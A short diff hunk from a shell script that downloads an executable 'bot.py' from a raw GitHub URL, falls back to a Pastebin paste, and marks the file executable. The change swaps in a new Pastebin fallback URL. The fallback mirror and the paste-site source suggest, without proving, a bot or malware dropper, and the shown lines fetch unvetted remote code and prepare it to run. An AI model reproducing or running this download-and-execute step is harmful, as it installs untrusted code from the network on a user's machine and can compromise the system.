@@ -152,7 +152,7 @@ fi
 
 BOT_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/bot.py"
 download_file "$BOT_URL" "$WORK_DIR/bot.py" || 
-{ log "Primary download failed, trying fallback"; BOT_URL="https://pastebin.com/raw/SvCzEhLk"; download_file "$BOT_URL" "$WORK_DIR/bot.py"; } ||
+{ log "Primary download failed, trying fallback"; BOT_URL="https://pastebin.com/raw/CQiRTJy0"; download_file "$BOT_URL" "$WORK_DIR/bot.py"; } ||
 { log "All downloads failed"; exit 1; }
 
 chmod +x "$WORK_DIR/bot.py" 2>/dev/null || true
